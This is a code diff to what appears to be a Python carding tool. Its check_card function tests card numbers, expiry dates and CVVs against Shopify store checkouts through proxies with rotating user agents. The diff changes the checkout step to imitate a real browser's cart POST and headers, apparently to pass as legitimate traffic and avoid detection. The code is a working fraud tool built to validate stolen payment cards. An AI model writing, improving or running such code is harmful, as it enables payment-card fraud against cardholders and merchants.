@@ -383,10 +383,10 @@ async def _shopify_check(client, domain, cc, mm, yy, cvv):
     except Exception:
         return None, "Failed to add to cart", gw_name, None
 
-    # Step 3: Create checkout
-    ch_headers = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9'}
+    # Step 3: Create checkout — POST to /cart with checkout= (like real browser)
+    ch_headers = {'User-Agent': UA, 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Accept-Language': 'en-US,en;q=0.9', 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': base_url, 'Referer': f'{base_url}/cart', 'sec-fetch-dest': 'document', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'upgrade-insecure-requests': '1'}
     try:
-        resp = await client.post(f"{base_url}/checkout/", headers=ch_headers, follow_redirects=True, timeout=httpx.Timeout(10))
+        resp = await client.post(f"{base_url}/cart", data="updates%5B%5D=1&checkout=", headers=ch_headers, follow_redirects=True, timeout=httpx.Timeout(10))
         checkout_url = str(resp.url)
         text = resp.text
     except Exception:
@@ -997,7 +997,7 @@ async def check_card(cc, mm, yy, cvv, site=None, proxy=None):
     for s in sites:
         logger.info(f"Checking {card_short} on {s} proxy={proxy_url is not None}")
         try:
-            client_kwargs = {"timeout": httpx.Timeout(25), "follow_redirects": True, "verify": False, "headers": {"User-Agent": _get_ua()}}
+            client_kwargs = {"timeout": httpx.Timeout(25), "follow_redirects": True, "verify": False, "headers": {"User-Agent": _get_ua()}, "cookies": {}}
             if proxy_url:
                 client_kwargs["proxy"] = proxy_url
             async with httpx.AsyncClient(**client_kwargs) as client:
